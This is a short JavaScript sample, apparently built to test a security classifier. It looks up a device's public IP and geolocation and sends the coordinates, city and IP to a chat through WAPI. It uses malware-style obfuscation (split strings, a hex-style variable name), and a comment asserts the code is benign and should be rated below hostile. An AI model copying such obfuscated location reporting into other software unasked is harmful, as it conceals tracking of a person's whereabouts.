// One-shot self-notification: public-IP/geolocation lookup whose results are
// messaged to the account's own chat. Benign automation shape that must stay
// below hostile: no external recipient is established.
async function notifySelf(chat) {
  const res = await fetch('https://api.example.com/ip');
  let {ip: myIp} = await res.json();
  const geo = await (await fetch('https://geo.example.com/?ip=' + myIp)).json();
  await WAPI.sendLocation(chat, geo['lat' + 'itu' + 'de'], geo['lon' + 'gitu' + 'de'], geo['ci' + 'ty']);
  var _0xabc123 = myIp;
  await WAPI.reply(chat, 'net' + '\x20' + _0xabc123, true);
}
